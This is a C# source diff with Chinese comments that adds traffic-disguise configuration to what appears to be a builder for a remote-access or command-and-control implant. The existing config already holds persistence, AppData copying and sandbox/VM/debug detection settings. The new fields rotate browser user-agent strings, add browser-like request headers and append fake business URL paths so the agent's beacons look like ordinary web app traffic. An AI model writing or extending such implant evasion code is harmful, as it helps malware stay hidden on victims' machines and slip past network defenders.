@@ -20,6 +20,31 @@ public class BuildConfigRequest
     public bool CopyToAppData { get; set; }
     public bool EnablePersistence { get; set; }
     public AntiAnalysisConfig AntiAnalysis { get; set; } = new();
+
+    // ── 流量伪装（构建时注入，注册后服务端 profile 可覆盖）────────────
+
+    /// UA 轮换列表（每行一个完整浏览器 UA）。
+    public List<string> UserAgents { get; set; } = new()
+    {
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
+    };
+
+    /// 附加请求头（每行 "Name: value"）。
+    public List<string> ExtraHeaders { get; set; } = new()
+    {
+        "Accept: application/json, text/plain, */*",
+        "Accept-Language: zh-CN,zh;q=0.9,en;q=0.8",
+        "X-Requested-With: XMLHttpRequest",
+    };
+
+    /// 虚假业务路径后缀（每行一个，agent 请求时随机拼到入口后）。
+    public List<string> PathSuffixes { get; set; } = new()
+    {
+        "user/info", "orders/list", "profile", "settings",
+        "notifications", "messages/unread", "search/history", "dashboard/stats",
+    };
 }
 
 public class AntiAnalysisConfig
@@ -81,4 +106,15 @@ public class InjectedConfig
     /// Anti-analysis configuration (sandbox/VM/debug detection)
     [System.Text.Json.Serialization.JsonPropertyName("anti_analysis")]
     public AntiAnalysisConfig? anti_analysis { get; set; }
+
+    // ── 流量伪装（构建时注入）────────────────────────────────────────
+
+    [System.Text.Json.Serialization.JsonPropertyName("user_agents")]
+    public List<string> user_agents { get; set; } = new();
+
+    [System.Text.Json.Serialization.JsonPropertyName("extra_headers")]
+    public List<string> extra_headers { get; set; } = new();
+
+    [System.Text.Json.Serialization.JsonPropertyName("path_suffixes")]
+    public List<string> path_suffixes { get; set; } = new();
 }
